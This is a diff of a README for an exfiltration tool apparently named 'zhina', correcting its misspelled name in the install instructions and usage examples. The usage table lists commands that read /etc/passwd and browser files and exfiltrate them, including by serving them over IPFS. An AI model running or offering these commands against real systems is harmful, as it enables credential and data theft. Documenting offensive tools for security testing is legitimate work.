@@ -21,12 +21,12 @@ You can install a few ways:
 1. Download the binary for your OS from https://github.com/HadessCS/zhina/releases
 1. or use `go install`
    ```
-   go install -v github.com/hadesscs/zhian
+   go install -v github.com/hadesscs/zhina
    ```
 1. or clone the git repo and build
    ```
-   git clone https://github.com/hadesscs/zhian.git
-   cd zhian
+   git clone https://github.com/hadesscs/zhina.git
+   cd zhina
    go get -v
    go build
    ```
@@ -43,7 +43,7 @@ infura:
 ```
 
 
-When zhian runs it checks the current directory for a `config.yaml`, if you wish to use a different configuration file use the command `--config /path/to/file.yaml`
+When zhina runs it checks the current directory for a `config.yaml`, if you wish to use a different configuration file use the command `--config /path/to/file.yaml`
 
 
 ## Command Line Options
@@ -66,7 +66,7 @@ When zhian runs it checks the current directory for a `config.yaml`, if you wish
 ##  Example Usage
 | Command | Details |
 |:--|:--|
-| `zhian --do encode64 --path /etc/passwd` | Exfiltrate password file |
+| `zhina --do encode64 --path /etc/passwd` | Exfiltrate password file |
 | `zhina --path browser --slice slice1M --serve ipfs` | Exfiltrate Browser Files with 1M slice and serve on ipfs |
 | `zhina --path /etc/passwd --slice slice1M --serve simple` | Exfiltrate Browser Files with 1M slice and serve on simple |
 
